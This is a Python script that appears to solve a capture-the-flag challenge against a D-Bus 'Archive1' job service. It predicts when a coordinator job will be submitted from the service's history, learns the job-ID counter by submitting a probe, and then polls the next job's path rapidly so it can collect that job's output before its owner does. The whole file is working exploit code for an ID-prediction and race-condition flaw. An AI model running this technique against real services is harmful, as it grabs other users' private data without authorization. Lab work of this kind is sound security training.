#!/usr/bin/env python3
import dbus
import re
import time
import os

bus = dbus.bus.BusConnection("unix:path=/run/archive-bus/bus")
obj = bus.get_object("org.ctf.Archive1", "/org/ctf/Archive1")
mgr = dbus.Interface(obj, "org.ctf.Archive1.Manager")

def job_iface(path):
    jo = bus.get_object("org.ctf.Archive1", path)
    return dbus.Interface(jo, "org.ctf.Archive1.Job")

def extract_id(path):
    m = re.search(r"j(\d+)$", str(path))
    return int(m.group(1)) if m else None

def collect(path):
    ji = job_iface(path)
    t0 = time.time()
    while time.time() - t0 < 1.0:
        s = ji.GetStatus()
        if s[0] not in ("Queued", "Running"):
            break
        time.sleep(0.005)
    fd = ji.Collect()
    n = fd.take()
    data = b""
    while True:
        chunk = os.read(n, 65536)
        if not chunk:
            break
        data += chunk
    os.close(n)
    return data

# Step 1: history -> predicted next coordinator submission time (remote clock)
hist = mgr.GetHistory()
last_sub_us = max(t for t, s in hist if "submitted" in s)
now_us = int(time.time() * 1e6)
period_us = 10000700
# find next predicted boundary after now
k = (now_us - last_sub_us) // period_us + 1
predicted_us = last_sub_us + k * period_us
print(f"now={now_us} last_sub={last_sub_us} predicted_next={predicted_us} "
      f"in={ (predicted_us-now_us)/1e6:.2f}s", flush=True)

# Step 2: learn current id counter with a single submit+collect, done EARLY
# (well before predicted window) so the quota is freed well in advance.
path = mgr.Submit("welcome")
my_id = extract_id(path)
print(f"probe id={my_id}", flush=True)
data = collect(path)
print(f"probe collected {len(data)} bytes, quota freed", flush=True)

next_coord_id = my_id + 1
gpath = f"/org/ctf/Archive1/jobs/j{next_coord_id}"
print(f"watching {gpath} for coordinator job", flush=True)

# Step 3: idle until ~250ms before predicted time, then hot-poll GetStatus only
wake_us = predicted_us - 250000
while int(time.time() * 1e6) < wake_us:
    time.sleep(0.02)

ji = job_iface(gpath)
found = False
t0 = time.time()
while time.time() - t0 < 3.0:
    try:
        s = ji.GetStatus()
        print(f"STATUS @ {time.time()-t0:.3f}s: {s}", flush=True)
        found = True
        try:
            fd = ji.Collect()
            n = fd.take()
            data = b""
            while True:
                chunk = os.read(n, 65536)
                if not chunk:
                    break
                data += chunk
            os.close(n)
            print(f"COLLECTED {len(data)} bytes:", flush=True)
            print(data.decode(errors="replace"), flush=True)
            break
        except Exception as ce:
            print(f"collect failed: {ce}", flush=True)
    except dbus.exceptions.DBusException as e:
        if "UnknownObject" not in str(e):
            print(f"status err: {e}", flush=True)
    # no sleep: hammer as fast as possible, GetStatus is free (not quota-limited)

if not found:
    print("never saw the job alive via GetStatus in the window", flush=True)
print("done", flush=True)
